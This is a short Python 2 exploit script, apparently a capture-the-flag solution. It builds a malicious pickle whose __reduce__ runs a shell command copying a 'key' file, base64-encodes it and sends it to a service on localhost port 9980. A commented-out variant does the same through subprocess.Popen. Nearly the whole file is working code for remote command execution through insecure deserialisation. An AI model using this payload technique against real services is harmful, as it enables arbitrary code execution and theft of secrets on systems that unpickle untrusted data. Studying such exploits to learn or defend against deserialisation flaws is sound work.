#! /usr/bin/env python
import socket
import sys
import base64
import cPickle
import os

class Exploit(object):

    def __reduce__(self):
        return (os.system,
              (('/bin/bash -c "cp saves/key saves/YWFh"'),
               ))
  
'''
  def __reduce__(self):
    global ggg
    ggg=3
    return (subprocess.Popen,
        (('/bin/cp','key.txt','key_copied.txt'), # args
            0,            # bufsize
            None
            ))
            '''
    
HOST, PORT = "localhost", 9980
#data = " ".join(sys.argv[1:])
# Create a socket (SOCK_STREAM means a TCP socket)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def send_msg(data):
    sock.sendall(data + "\n")

def recv_msg():
    # Receive data from the server and shut down
    received = sock.makefile().readline().strip()
    return received

try:
    
    exploit_str = base64.b64encode(cPickle.dumps(Exploit()))
    print exploit_str
    print str(len(exploit_str))
    
    # Connect to server and send data
    sock.connect((HOST, PORT))
    send_msg(base64.b64encode(cPickle.dumps(Exploit())))
    print recv_msg()

finally:
    sock.close()
